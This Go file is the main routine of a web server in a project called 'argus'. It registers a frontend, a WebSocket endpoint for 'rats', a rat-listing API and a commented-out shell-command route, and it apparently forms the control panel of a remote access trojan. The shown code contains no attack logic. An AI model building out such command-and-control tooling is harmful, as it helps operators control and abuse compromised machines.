package main

import (
	"argus/backend/handlers"
	"log"
	"net/http"
	"path/filepath"
)

func main() {
	staticPath := filepath.Join("backend", "static")
	http.Handle("/_app/", http.StripPrefix("/_app/", http.FileServer(http.Dir(filepath.Join(staticPath, "_app")))))
	http.HandleFunc("/", handlers.ServeFrontend)

	http.HandleFunc("/ws/rat", handlers.RatWebSocketHandler)
	http.HandleFunc("/ws/frontend", handlers.FrontendWebSocketHandler)

	http.HandleFunc("/api/rats", handlers.GetRats)
	//http.HandleFunc("/api/shell/", handlers.ShellCommandHandler)

	log.Println("Server starting on http://localhost:8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal(err)
	}
}
